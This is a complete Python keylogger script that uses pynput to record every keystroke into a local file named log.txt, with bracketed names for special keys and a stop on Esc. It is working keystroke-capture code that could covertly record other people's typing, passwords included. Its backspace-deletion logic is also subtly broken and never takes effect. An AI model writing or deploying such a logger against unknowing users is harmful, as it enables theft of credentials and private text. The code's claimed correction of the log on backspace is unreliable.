import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    if key == Key.backspace:
        if len(keys) > 0:
            keys.pop()  # Remove the last key from the list
            truncate_file("log.txt")  # Delete the last character in the log file
    else:
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 1:  # Adjusted the condition to match your requirement
            count = 0
            write_file(keys)
            keys.clear()  # Clear the keys list


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write(" [" + k.replace("Key.", "") + "] ")


def truncate_file(file_path):
    with open(file_path, "rb+") as f:
        f.seek(-1, 2)  # Move the file pointer to the last character
        f.truncate()   # Truncate the file at the current position


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
